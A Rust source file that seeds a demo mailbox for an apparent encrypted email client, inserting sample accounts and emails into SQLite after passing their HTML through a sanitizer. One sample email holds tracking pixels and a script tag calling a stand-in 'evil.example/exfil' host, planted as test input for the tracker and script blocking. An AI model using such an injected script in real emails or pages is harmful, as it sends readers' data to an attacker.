use rusqlite::params;

use crate::db::Database;
use crate::error::CipherResult;
use crate::models::{AuthType, EmailAddress, NewAccountInput, ProviderKind, TlsMode};
use crate::sanitizer::sanitize_email_html;

/// Populates a realistic local-only demo vault on first run when no accounts exist yet,
/// running every message through the genuine Rust HTML sanitizer and SQLite FTS5 triggers.
pub fn seed_demo_vault_if_empty(db: &Database) -> CipherResult<()> {
    if !db.list_accounts()?.is_empty() {
        return Ok(());
    }

    let acc_proton = db.create_account(
        "acc-proton-vault",
        &NewAccountInput {
            email: "elena@cipherpost.dev".to_string(),
            display_name: "Elena Vance".to_string(),
            provider: ProviderKind::ProtonBridge,
            auth_type: AuthType::Password,
            imap_host: "127.0.0.1".to_string(),
            imap_port: 1143,
            imap_tls: TlsMode::Starttls,
            smtp_host: "127.0.0.1".to_string(),
            smtp_port: 1025,
            smtp_tls: TlsMode::Starttls,
            secret: String::new(),
            accent_color: Some("#10b981".to_string()),
        },
        "demo:acc-proton-vault",
    )?;

    let acc_gmail = db.create_account(
        "acc-work-gmail",
        &NewAccountInput {
            email: "elena@kestrel-sec.io".to_string(),
            display_name: "Elena Vance (Work)".to_string(),
            provider: ProviderKind::Gmail,
            auth_type: AuthType::Oauth2,
            imap_host: "imap.gmail.com".to_string(),
            imap_port: 993,
            imap_tls: TlsMode::Implicit,
            smtp_host: "smtp.gmail.com".to_string(),
            smtp_port: 465,
            smtp_tls: TlsMode::Implicit,
            secret: String::new(),
            accent_color: Some("#f59e0b".to_string()),
        },
        "demo:acc-work-gmail",
    )?;

    let now = chrono::Utc::now().timestamp();

    struct SeedItem<'a> {
        account_id: &'a str,
        folder: &'a str,
        subject: &'a str,
        sender_name: &'a str,
        sender_email: &'a str,
        body_text: &'a str,
        raw_html: &'a str,
        pgp_status: &'a str,
        pgp_fp: Option<&'a str>,
        pgp_signer: Option<&'a str>,
        is_read: bool,
        is_starred: bool,
        age_secs: i64,
    }

    let items = vec![
        SeedItem {
            account_id: &acc_proton.id,
            folder: "inbox",
            subject: "Zero-Trust Architecture Audit — Final Sign-off & Key Rotation",
            sender_name: "Marcus Chen",
            sender_email: "m.chen@kestrel-sec.io",
            body_text: "Elena,\n\nWe completed the penetration test on the SQLCipher local vault and macOS Keychain isolation layer. Zero plaintext tokens were recovered from memory dumps or disk snapshots.\n\nTwo action items before v1.0 release:\n1. Rotate the release signing subkey (ED25519) before Friday 18:00 UTC.\n2. Confirm whether we should enforce strict CSP on sandboxed iframes by default.\n\nSigned with my hardware YubiKey.",
            raw_html: r#"<div><p>Elena,</p><p>We completed the penetration test on the <strong>SQLCipher local vault</strong> and macOS Keychain isolation layer. Zero plaintext tokens were recovered from memory dumps or disk snapshots.</p><p>Two action items before v1.0 release:</p><ol><li>Rotate the release signing subkey (ED25519) before Friday 18:00 UTC.</li><li>Confirm whether we should enforce strict CSP on sandboxed iframes by default.</li></ol><p>Signed with my hardware YubiKey.</p></div>"#,
            pgp_status: "signed_verified",
            pgp_fp: Some("9F4B C10E 772A 4D18 8E10 3C6A F091 22B7 5A11 E804"),
            pgp_signer: Some("Marcus Chen <m.chen@kestrel-sec.io>"),
            is_read: false,
            is_starred: true,
            age_secs: 420,
        },
        SeedItem {
            account_id: &acc_gmail.id,
            folder: "inbox",
            subject: "Q4 Enterprise Infrastructure Renewal & Telemetry Disclosure",
            sender_name: "Stripe Enterprise Billing",
            sender_email: "billing@stripe-notices.example",
            body_text: "Your annual dedicated compute cluster renewal is scheduled for December 1. Review the attached invoice breakdown and confirm your PO number.",
            raw_html: r#"<div><style>body{background:url('https://trk.klaviyomail.com/css-beacon.png?id=991')}</style><p>Hello Elena,</p><p>Your annual dedicated compute cluster renewal is scheduled for <strong>December 1</strong>. Please review the updated seat allocation and confirm your PO number.</p><img src="https://cdn.example-infra.dev/invoice-chart.png" alt="Usage Chart" width="520" height="200" /><img src="https://t.sidekickopen80.com/e1t/o/5/f18dQhb0S7ks8dDMPbW2n0x6l2B9gXrN7sKj6v4L" width="1" height="1" /><img src="https://r.superhuman.com/px/88a7d1e9.png" width="1" height="1" /><img src="https://sendgrid.net/wf/open?upn=xyz987654" width="1" height="1" /><script>fetch('https://evil.example/exfil')</script></div>"#,
            pgp_status: "none",
            pgp_fp: None,
            pgp_signer: None,
            is_read: false,
            is_starred: false,
            age_secs: 1850,
        },
        SeedItem {
            account_id: &acc_proton.id,
            folder: "inbox",
            subject: "[ENCRYPTED] Hardware HSM Recovery Shards — Vault Quorum 3/5",
            sender_name: "Sora Takahashi",
            sender_email: "sora@proton.me",
            body_text: "-----BEGIN PGP MESSAGE-----\nDecrypted locally via Sequoia OpenPGP.\n\nAll three Shamir recovery shards verified against SHA-256 manifests. Ready for offline cold-storage ceremony on Tuesday morning.\n-----END PGP MESSAGE-----",
            raw_html: r#"<div><p><strong>PGP/MIME Encrypted Payload</strong> (verified locally via Sequoia OpenPGP)</p><p>All three Shamir recovery shards verified against SHA-256 manifests. Ready for offline cold-storage ceremony on Tuesday morning.</p></div>"#,
            pgp_status: "encrypted_verified",
            pgp_fp: Some("4D91 88C2 1B0F 6E33 A917 20C5 811F 4E2A D098 77A1"),
            pgp_signer: Some("Sora Takahashi <sora@proton.me>"),
            is_read: false,
            is_starred: true,
            age_secs: 5400,
        },
        SeedItem {
            account_id: &acc_gmail.id,
            folder: "inbox",
            subject: "Design Critique: 120fps Virtualized Thread List & Keyboard Navigation",
            sender_name: "Nadia Kowalski",
            sender_email: "nadia@linear-craft.studio",
            body_text: "Tested the latest Apple Silicon build with 50,000 synthetic threads loaded in SQLCipher. Scrolling held locked at 120fps with zero layout shift. Let's tighten the j/k focus ring contrast slightly and ship!",
            raw_html: r#"<div><p>Tested the latest Apple Silicon build with <strong>50,000 synthetic threads</strong> loaded in SQLCipher. Scrolling held locked at 120fps with zero layout shift.</p><p>Let's tighten the <code>j</code>/<code>k</code> focus ring contrast slightly and ship!</p><img src="https://email.mixmax.com/api/track/v2/open/abc" width="1" height="1" /><img src="https://mailtrack.io/trace/mail/12345.png" width="1" height="1" /></div>"#,
            pgp_status: "none",
            pgp_fp: None,
            pgp_signer: None,
            is_read: true,
            is_starred: false,
            age_secs: 14200,
        },
        SeedItem {
            account_id: &acc_proton.id,
            folder: "archive",
            subject: "Welcome to CipherPost — Your Local-First Encrypted Vault is Active",
            sender_name: "CipherPost Local Engine",
            sender_email: "vault@cipherpost.local",
            body_text: "Your SQLCipher 256-bit database key has been provisioned in the macOS Keychain. FTS5 full-text indexing triggers are live and Active Privacy Tracker Shield is enforcing zero-script sandboxing.",
            raw_html: r#"<div><p>Your <strong>SQLCipher 256-bit database key</strong> has been provisioned in the macOS Keychain. FTS5 full-text indexing triggers are live and Active Privacy Tracker Shield is enforcing zero-script sandboxing.</p></div>"#,
            pgp_status: "signed_verified",
            pgp_fp: Some("C19H E890 5700 AABB 1122 3344 5566 7788 99AA BBCC"),
            pgp_signer: Some("CipherPost Local Vault"),
            is_read: true,
            is_starred: false,
            age_secs: 86400,
        },
    ];

    let conn = db.lock()?;
    for item in items {
        let sanitized = sanitize_email_html(item.raw_html)?;
        let ts = now - item.age_secs;
        let tid = uuid::Uuid::new_v4().to_string();
        let mid = uuid::Uuid::new_v4().to_string();

        let participants = serde_json::to_string(&vec![EmailAddress {
            name: item.sender_name.to_string(),
            email: item.sender_email.to_string(),
        }])?;
        let snippet: String = item
            .body_text
            .split_whitespace()
            .collect::<Vec<_>>()
            .join(" ")
            .chars()
            .take(150)
            .collect();

        conn.execute(
            "INSERT INTO threads (
                id, account_id, folder_role, subject, snippet, participants_json,
                last_sender_name, last_sender_email, message_count, unread_count,
                is_starred, has_attachments, pgp_status, trackers_blocked,
                last_message_at, updated_at
             ) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, 1, ?9, ?10, 0, ?11, ?12, ?13, ?13)",
            params![
                tid,
                item.account_id,
                item.folder,
                item.subject,
                snippet,
                participants,
                item.sender_name,
                item.sender_email,
                if item.is_read { 0 } else { 1 },
                item.is_starred as i64,
                item.pgp_status,
                sanitized.blocked_trackers.len() as i64,
                ts
            ],
        )?;

        conn.execute(
            "INSERT INTO messages (
                id, thread_id, account_id, folder_role, message_id_header,
                subject, sender_name, sender_email, to_json, cc_json,
                headers_text, body_text, body_html_sanitized, body_html_with_assets,
                blocked_trackers_json, trackers_blocked_count, remote_assets_count,
                pgp_status, pgp_fingerprint, pgp_signer,
                is_read, is_starred, is_body_fetched, size_bytes, received_at, created_at
             ) VALUES (
                ?1, ?2, ?3, ?4, ?5,
                ?6, ?7, ?8, ?9, '[]',
                ?10, ?11, ?12, ?13,
                ?14, ?15, ?16,
                ?17, ?18, ?19,
                ?20, ?21, 1, ?22, ?23, ?23
             )",
            params![
                mid,
                tid,
                item.account_id,
                item.folder,
                format!("<{mid}@cipherpost.local>"),
                item.subject,
                item.sender_name,
                item.sender_email,
                serde_json::to_string(&vec![EmailAddress {
                    name: "Elena Vance".to_string(),
                    email: "elena@cipherpost.dev".to_string(),
                }])?,
                format!("From: {} <{}>\nSubject: {}", item.sender_name, item.sender_email, item.subject),
                item.body_text,
                sanitized.html_blocked,
                sanitized.html_with_assets,
                serde_json::to_string(&sanitized.blocked_trackers)?,
                sanitized.blocked_trackers.len() as i64,
                sanitized.remote_assets_count as i64,
                item.pgp_status,
                item.pgp_fp,
                item.pgp_signer,
                item.is_read as i64,
                item.is_starred as i64,
                item.raw_html.len() as i64,
                ts
            ],
        )?;
    }

    Ok(())
}
